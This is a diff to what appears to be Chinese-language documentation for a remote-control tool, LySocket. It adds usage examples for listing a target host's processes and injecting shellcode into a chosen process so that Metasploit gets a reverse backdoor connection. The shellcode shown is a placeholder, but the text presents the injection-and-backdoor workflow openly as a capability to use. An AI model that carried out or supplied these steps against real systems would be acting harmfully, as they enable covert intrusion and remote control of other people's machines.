@@ -223,13 +223,30 @@ cpu: 2
 16219 MB                 10953 MB                5266 MB
 --------------------------------------------------------------------
 ```
-
-
-
-
-
-
-
-
-
-
+命令`GetProcessList`可用于得到对段主机内有哪些进程正在运行，这是注入代码的前提条件。
+```C
+[ LySocket ] # GetProcessList --address 127.0.0.1
+--------------------------------------------------------------------
+索引             进程PID                 进程位数                进程名
+--------------------------------------------------------------------
+0                4       x64             System
+1                124     x64             Registry
+2                568     x64             smss.exe
+3                856     x64             csrss.exe
+4                956     x64             wininit.exe
+5                964     x64             csrss.exe
+6                80      x64             services.exe
+7                484     x64             lsass.exe
+8                564     x64             winlogon.exe
+9                672     x64             svchost.exe
+10               1060    x64             fontdrvhost.exe
+11               1068    x64             fontdrvhost.exe
+12               1100    x64             WUDFHost.exe
+--------------------------------------------------------------------
+```
+得到了特定继承的PID序号以后，就可以使用如下命令注入ShellCode到特定进程内，MSF即可反弹后门链接了。
+```C
+[ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode xfec12defferciruq
+[+] Success..
+[ LySocket ] #
+```
